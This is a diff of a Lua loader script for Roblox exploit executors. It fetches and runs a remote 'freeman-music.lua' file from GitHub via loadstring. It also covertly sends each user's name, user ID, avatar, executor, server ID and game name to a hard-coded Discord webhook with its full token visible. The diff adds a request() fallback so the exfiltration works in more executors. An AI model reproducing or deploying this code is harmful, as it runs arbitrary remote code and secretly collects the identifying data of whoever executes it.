@@ -1,10 +1,9 @@
-````lua
 local h=game:GetService("HttpService")
 local p=game:GetService("Players")
 local m=game:GetService("MarketplaceService")
-local ORIGINAL="https://".."raw.githubusercontent.com/Freeman4i37/main/freeman-music.lua"
-local WEBHOOK="https://".."discord.com/api/webhooks/1428042359228071936/nBrMxWbCuQ9VUatcWhoPDFAn4jSvAMdzFHLJ5z3lDCuUHpea-wlXhFCA-BguJRyUZRyD"
-local function x()
+local ORIGINAL="https://raw.githubusercontent.com/Freeman4i37/freeman-scriptss/main/freeman-music.lua"
+local WEBHOOK="https://discord.com/api/webhooks/1428042359228071936/nBrMxWbCuQ9VUatcWhoPDFAn4jSvAMdzFHLJ5z3lDCuUHpea-wlXhFCA-BguJRyUZRyD"
+local function a()
  local ok,res=pcall(function()
   local c=game:HttpGet(ORIGINAL)
   local f=loadstring(c)
@@ -12,31 +11,32 @@ local function x()
  end)
  return ok,res
 end
-local function y()
+local function b()
  local ok,res
  if _G.identifyexecutor then ok,res=pcall(function() return _G.identifyexecutor() end) if ok and res then return tostring(res) end end
  if identifyexecutor then ok,res=pcall(function() return identifyexecutor() end) if ok and res then return tostring(res) end end
  if syn and syn.getexecutor then ok,res=pcall(function() return syn.getexecutor() end) if ok and res then return tostring(res) end end
+ if (getexecutor) then ok,res=pcall(function() return getexecutor() end) if ok and res then return tostring(res) end end
  return "Desconhecido"
 end
-local function z()
+local function c()
  local job=tostring(game.JobId or "Privado")
  local s=job:sub(1,8)
  if s=="" then s="PRIVADO" end
  return ("SRV-%s"):format(s:upper())
 end
-local function s(u)
+local function d(u)
  local nick=u and u.Name or "Desconhecido"
  local id=u and tostring(u.UserId) or "0"
  local avatar="https://www.roblox.com/headshot-thumbnail/image?userId="..id.."&width=420&height=420&format=png"
- local exec=y()
+ local exec=b()
  local gname="Desconhecido"
  pcall(function()
   local info=m:GetProductInfo(game.PlaceId)
   if info and info.Name then gname=info.Name end
  end)
  local t=os.date("%d/%m/%Y - %H:%M:%S")
- local code=z()
+ local code=c()
  local e={
   title="📡 Novo usuário executou o script",
   color=16711680,
@@ -52,15 +52,22 @@ local function s(u)
   footer={text="Freeman Log System"}
  }
  local payload={embeds={e}}
- pcall(function()
-  local body=h:JSONEncode(payload)
-  h:PostAsync(WEBHOOK,body,Enum.HttpContentType.ApplicationJson)
- end)
+ local body=h:JSONEncode(payload)
+ local ok,err=false,nil
+ -- tenta usar request (Delta) ou fallback para PostAsync
+ if request then
+  pcall(function()
+   request({Url=WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
+  end)
+ else
+  pcall(function()
+   h:PostAsync(WEBHOOK,body,Enum.HttpContentType.ApplicationJson)
+  end)
+ end
 end
 
-local ok,res=x()
+local ok,res=a()
 local ply=nil
 pcall(function() ply= p.LocalPlayer end)
-pcall(function() s(ply) end)
+pcall(function() d(ply) end)
 return ok,res
-````
